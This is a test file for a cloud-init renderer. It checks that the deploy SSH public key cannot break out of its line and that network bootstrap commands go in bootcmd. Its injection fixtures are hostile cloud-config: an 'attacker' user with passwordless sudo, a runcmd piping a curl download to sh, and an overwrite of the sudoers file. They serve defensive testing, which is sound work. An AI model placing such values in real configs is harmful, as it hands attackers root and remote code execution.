import { readFileSync } from 'node:fs';
import { join } from 'node:path';

import { describe, expect, it } from 'vitest';

import { assertDeployPublicKey, renderCloudInit } from './cloudInit';

/**
 * `renderCloudInit` writes the `deploy` account and its root sudoers drop-in. A newline in
 * the public key would append arbitrary cloud-config, and `userData` is never re-applied.
 */

const ED25519 = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLE';

describe('assertDeployPublicKey', () => {
  it('accepts an ed25519 key with a comment', () => {
    expect(assertDeployPublicKey(`${ED25519} deploy@edge1`)).toBe(`${ED25519} deploy@edge1`);
  });

  it('accepts a key with no comment', () => {
    expect(assertDeployPublicKey(ED25519)).toBe(ED25519);
  });

  it('accepts rsa, ecdsa and security-key types', () => {
    const blob = 'AAAAB3NzaC1yc2EAAAADAQABAAABgQexample';
    for (const type of [
      'ssh-rsa',
      'ecdsa-sha2-nistp256',
      'ecdsa-sha2-nistp384',
      'ecdsa-sha2-nistp521',
      'sk-ssh-ed25519@openssh.com',
      'sk-ecdsa-sha2-nistp256@openssh.com',
    ]) {
      expect(() => assertDeployPublicKey(`${type} ${blob}`)).not.toThrow();
    }
  });

  it('accepts base64 padding', () => {
    expect(() => assertDeployPublicKey('ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AA==')).not.toThrow();
  });

  it('accepts spaces after the blob, because that is the comment field', () => {
    // `ssh-keygen -C 'deploy on edge1'` produces exactly this. The property
    // being defended is that the value cannot end its line, not that it is a
    // well-formed key — anything after the blob is a comment by definition.
    expect(() => assertDeployPublicKey(`${ED25519} deploy on edge1`)).not.toThrow();
  });

  describe('rejects anything that can end the line it is on', () => {
    // Each of these is a working cloud-config injection if it reaches the
    // template. The last two are the ones a copy-paste produces by accident,
    // which is why a trailing newline is a rejection and not trimmed away.
    const injections: Record<string, string> = {
      'a second users entry granting a shell': `${ED25519} x\nusers:\n  - name: attacker\n    sudo: ALL=(ALL) NOPASSWD:ALL`,
      'a runcmd': `${ED25519} x\nruncmd:\n  - [ sh, -c, "curl http://example.invalid | sh" ]`,
      'a write_files replacing the sudoers drop-in': `${ED25519} x\nwrite_files:\n  - path: /etc/sudoers.d/50-branchleft-deploy\n    content: "deploy ALL=(ALL) NOPASSWD:ALL"`,
      'a carriage return': `${ED25519}\rruncmd: []`,
      'a trailing newline from `cat`': `${ED25519}\n`,
      'a leading newline': `\n${ED25519}`,
    };
    for (const [name, value] of Object.entries(injections)) {
      it(name, () => {
        expect(() => assertDeployPublicKey(value)).toThrow(/single-line OpenSSH public key/);
      });
    }
  });

  describe('rejects values that are not a public key at all', () => {
    const rejected: Record<string, string> = {
      empty: '',
      'whitespace only': '   ',
      'a private key': '-----BEGIN OPENSSH PRIVATE KEY-----',
      'a bare comment': 'deploy@edge1',
      'an unknown key type': `ssh-dss ${'A'.repeat(20)}`,
      'a type with no blob': 'ssh-ed25519',
      'a blob with YAML metacharacters': 'ssh-ed25519 AAAA:BBBB',
      'a path rather than a key': '~/.ssh/id_ed25519.pub',
    };
    for (const [name, value] of Object.entries(rejected)) {
      it(name, () => {
        expect(() => assertDeployPublicKey(value)).toThrow();
      });
    }
  });

  it('names the value rather than echoing it, so a rejection is not a disclosure', () => {
    // The key is public, but the same message shape would carry a private one
    // pasted into the wrong config key by mistake.
    try {
      assertDeployPublicKey('-----BEGIN OPENSSH PRIVATE KEY-----\nsecret-material');
      expect.unreachable('should have thrown');
    } catch (error) {
      expect((error as Error).message).not.toContain('secret-material');
    }
  });
});

/**
 * Private-only hosts get no default route or resolver from DHCP, so the bootstrap must
 * sit in `bootcmd` (it runs before `package_update`). Assertions check block membership.
 */
describe('renderCloudInit', () => {
  const BASE = {
    hostname: 'db1',
    deployPublicKey: 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEXAMPLE deploy@db1',
  };

  async function render(privateOnly: boolean): Promise<string> {
    return new Promise((resolve) => {
      renderCloudInit({ ...BASE, privateOnly }).apply(resolve);
    });
  }

  /**
   * Extracts the content of one top-level cloud-config block, from
   * `key:` to (exclusive) the next top-level key, or to the end of the
   * document when `key` is the last block. A plain substring search would
   * be fooled by the same failure this file exists to catch: text that is
   * merely *near* `runcmd:` is not the same as text `scripts-user` will
   * actually execute as part of it.
   */
  function block(document: string, key: string): string {
    const startMatch = document.match(new RegExp(`\\n${key}:\\n?`));
    if (!startMatch || startMatch.index === undefined) {
      return '';
    }
    const rest = document.slice(startMatch.index + startMatch[0].length);
    const nextKey = rest.match(/\n[a-zA-Z_-]+:/);
    return nextKey && nextKey.index !== undefined ? rest.slice(0, nextKey.index) : rest;
  }

  it('adds no bootcmd block at all for a host with a public interface', async () => {
    const document = await render(false);
    expect(document).not.toContain('bootcmd:');
    expect(document).not.toContain('ip route replace');
    expect(document).not.toContain('resolvconf');
  });

  it('puts the route and resolver bootstrap in bootcmd for a private-only host', async () => {
    const document = await render(true);
    const bootcmd = block(document, 'bootcmd');
    expect(bootcmd).toContain('ip route replace default via');
    expect(bootcmd).toContain('resolvconf -u');
    expect(bootcmd).toContain('185.12.64.1');
    expect(bootcmd).toContain('185.12.64.2');
  });

  it('never puts the bootstrap in runcmd, which executes too late to help', async () => {
    const document = await render(true);
    const runcmd = block(document, 'runcmd');
    expect(runcmd).not.toContain('ip route replace');
    expect(runcmd).not.toContain('resolvconf');
    // The existing runcmd entries are still exactly where they were.
    expect(runcmd).toContain('/etc/branchleft');
    expect(runcmd).toContain('sshd');
  });

  it('emits exactly one bootcmd block and one runcmd block', async () => {
    const document = await render(true);
    expect(document.split('bootcmd:').length - 1).toBe(1);
    expect(document.split('runcmd:').length - 1).toBe(1);
  });
});

/**
 * With no enrolment the document is what it was before enrolment existed, byte
 * for byte. The two files in `testdata/` were rendered by `cloudInit.ts` as it
 * stands on `origin/main`, before any edit of this change, from the arguments
 * below, and are not regenerated. `userData` is create-time-only and in the
 * component's `ignoreChanges`, so a flag-off change here would not reach a
 * running host, but it would reach the next host created, and no diff would show it.
 */
describe('a host with no enrolment gets the document it always did', () => {
  const golden = (name: string): string =>
    readFileSync(join(__dirname, 'testdata', `cloud-init-${name}.golden`), 'utf8');
  const args = {
    hostname: 'db1',
    deployPublicKey: 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEXAMPLE deploy@db1',
  };

  for (const [name, privateOnly] of [
    ['public', false],
    ['private-only', true],
  ] as const) {
    it(`is byte for byte the ${name} document from origin/main`, async () => {
      const document = await new Promise<string>((resolve) => {
        renderCloudInit({ ...args, privateOnly }).apply(resolve);
      });
      expect(document).toBe(golden(name));
    });
  }

  it('keeps the default entry first and the deploy entry beside it', () => {
    const document = golden('public');
    expect(document.indexOf('  - default')).toBeGreaterThan(-1);
    expect(document.indexOf('  - default')).toBeLessThan(document.indexOf('  - name: deploy'));
  });
});
